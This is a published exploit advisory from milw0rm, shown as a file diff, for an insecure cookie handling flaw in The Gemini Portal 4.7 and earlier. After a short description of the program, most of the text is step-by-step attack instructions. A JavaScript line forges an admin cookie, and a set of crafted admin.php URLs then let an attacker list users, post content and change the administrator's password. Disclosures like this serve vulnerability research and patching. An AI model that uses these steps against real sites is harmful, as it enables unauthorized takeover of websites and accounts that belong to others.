@@ -1,0 +1,63 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+The Gemini Portal <= 4.7 / Insecure Cookie Handling Vulnerability 
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Program: The Gemini Portal
+Version: <= 4.7
+File affected: admin/*
+Download: http://www.arzdev.com/downloads/1/Gemini
+
+
+Found by Pepelux <pepelux[at]enye-sec.org>
+eNYe-Sec - www.enye-sec.org
+
+
+>> Program description (by the author website) <<
+
+The Gemini Portal 4 is the most scalable, dynamic, and powerful content 
+management system there is. It is perfect for large business network services, 
+to the simple personal web site for use with PHP and MySQL.', 'The Gemini 
+Portal is a dynamic content management system. It is ideal for any size 
+community, allowing users, moderators, limited admins, and global admins log 
+in. Many of the built in pages use the dynamic database file system (ArzFS) 
+to manipulate files and folders.
+
+
+>> Bug <<
+
+You can access to the admin panel altering the cookie and adding a parameter
+in the navigation bar.
+
+
+>> Exploit <<
+
+Note: POST is not checked and you can enter all by GET. Also you can create a
+simple perl script to send GET and POST packages.
+
+First step: javascript:document.cookie = "user=admin"
+
+Second step: navigate by the admin panel adding the parameter '&name=users' in 
+the navigation bar. Examples: 
+    
+	to view the main admin panel:
+	http://site/admin.php?page=main&name=users
+
+	to list all forums:
+	http://site/admin.php?page=forums&name=users
+
+	to post a new forum:
+	http://site/admin.php?page=forums&name=users&page=forums&op=newf&fview=Everyone&fpost=Everyone&forumname=WHAT_YOU_WANT&descrip=WHAT_YOU_WANT
+
+	to list articles:
+	http://site/admin.php?page=articles&name=users
+
+	to create a new article:
+	http://site/admin.php?page=articles&name=users&op=newd&dtitle=WHAT_YOU_WANT&ppcontent=WHAT_YOU_WANT&dfolder=0&category=1&autor=admin
+
+	to list all users:
+	http://site/admin.php?page=users&name=users
+
+	to edit the admin profile (you can change the admin password)
+	http://site/admin.php?page=users&op=edi&uid=2&name=users
+
+# milw0rm.com [2008-09-26]
